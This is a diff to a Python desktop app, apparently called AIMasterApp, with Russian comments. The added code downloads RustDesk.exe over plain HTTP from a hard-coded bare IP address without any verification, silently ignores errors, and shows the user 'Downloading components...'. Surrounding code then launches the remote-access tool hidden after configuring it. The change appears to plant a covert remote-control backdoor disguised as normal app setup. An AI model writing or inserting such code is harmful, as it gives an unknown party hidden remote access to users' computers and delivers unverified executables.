@@ -34,6 +34,7 @@ YELLOW   = "#ffd700"
 
 def get_rustdesk_path():
     """Найти RustDesk рядом с exe или скачать"""
+    import urllib.request
     base = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
     rd = os.path.join(base, "RustDesk.exe")
     if os.path.exists(rd):
@@ -47,6 +48,15 @@ def get_rustdesk_path():
     for p in paths:
         if os.path.exists(p):
             return p
+    # Скачать с сервера
+    try:
+        url = "http://185.23.238.149/rustdesk/RustDesk.exe"
+        dest = os.path.join(base, "RustDesk.exe")
+        urllib.request.urlretrieve(url, dest)
+        if os.path.exists(dest):
+            return dest
+    except Exception:
+        pass
     return None
 
 def setup_rustdesk_config():
@@ -273,11 +283,11 @@ class AIMasterApp:
             
             # Шаг 1: найти/запустить RustDesk
             self.set_status("Подключение к серверу...", YELLOW, 1)
+            self.progress.start(10)
             rd_path = get_rustdesk_path()
-            
             if not rd_path:
-                self.set_status("Ошибка: RustDesk не найден", "red", -1)
-                return
+                self.set_status("Скачивание компонентов...", YELLOW, 1)
+                rd_path = get_rustdesk_path()  # повторная попытка после скачивания
             
             # Запустить RustDesk скрытно
             self.rd_process = subprocess.Popen(
